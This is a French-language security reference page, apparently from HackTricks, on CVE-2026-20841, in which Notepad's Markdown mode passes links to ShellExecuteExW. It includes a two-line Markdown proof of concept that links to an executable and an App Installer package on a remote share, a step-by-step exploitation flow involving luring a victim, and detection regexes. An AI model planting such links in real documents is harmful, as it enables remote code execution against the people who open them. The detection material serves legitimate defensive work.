# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Les applications Windows modernes qui rendent Markdown/HTML convertissent souvent les liens fournis par l'utilisateur en éléments cliquables et les transmettent à `ShellExecuteExW`. Sans une liste de schémas autorisés stricte, n'importe quel gestionnaire de protocole enregistré (p. ex. `file:`, `ms-appinstaller:`) peut être déclenché, entraînant l'exécution de code dans le contexte de l'utilisateur courant.

## Surface d'exposition de ShellExecuteExW en mode Markdown de Notepad
- Notepad choisit le mode Markdown **uniquement pour les extensions `.md`** via une comparaison de chaîne fixe dans `sub_1400ED5D0()`.
- Liens Markdown supportés :
- Standard : `[text](target)`
- Autolink : `<target>` (rendu comme `[target](target)`), donc les deux syntaxes comptent pour les payloads et les détections.
- Les clics sur les liens sont traités dans `sub_140170F60()`, qui effectue un filtrage faible puis appelle `ShellExecuteExW`.
- `ShellExecuteExW` délègue à **n'importe quel gestionnaire de protocole configuré**, pas seulement HTTP(S).

### Considérations sur les payloads
- Toute séquence `\\` dans le lien est **normalisée en `\`** avant `ShellExecuteExW`, ce qui affecte l'élaboration de chemins UNC/locaux et la détection.
- Les fichiers `.md` ne sont **pas associés à Notepad par défaut** ; la victime doit toujours ouvrir le fichier dans Notepad et cliquer sur le lien, mais une fois rendu, le lien est cliquable.
- Schémas d'exemple dangereux :
- `file://` pour lancer un payload local/UNC.
- `ms-appinstaller://` pour déclencher les flux d'App Installer. D'autres schémas enregistrés localement peuvent également être abusés.

### PoC Markdown minimal
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flux d'exploitation
1. Créer un **`.md` file`** afin que Notepad l'affiche en Markdown.
2. Inclure un lien utilisant un schéma d'URI dangereux (`file:`, `ms-appinstaller:`, ou tout gestionnaire installé).
3. Distribuer le fichier (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similaire) et convaincre l'utilisateur de l'ouvrir dans Notepad.
4. Au clic, le **lien normalisé** est transmis à `ShellExecuteExW` et le gestionnaire de protocole correspondant exécute le contenu référencé dans le contexte de l'utilisateur.

## Idées de détection
- Surveiller les transferts de fichiers `.md` sur les ports/protocoles qui livrent couramment des documents : `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analyser les liens Markdown (standard et autolink) et rechercher **insensible à la casse** `file:` ou `ms-appinstaller:`.
- Regex recommandées par les fournisseurs pour détecter l'accès à des ressources distantes :
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Le comportement du patch autorise apparemment en liste blanche les fichiers locaux et HTTP(S) ; tout autre élément ciblant `ShellExecuteExW` est suspect. Étendez les détections aux autres gestionnaires de protocole installés au besoin, car la surface d'attaque varie selon le système.

## Références
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
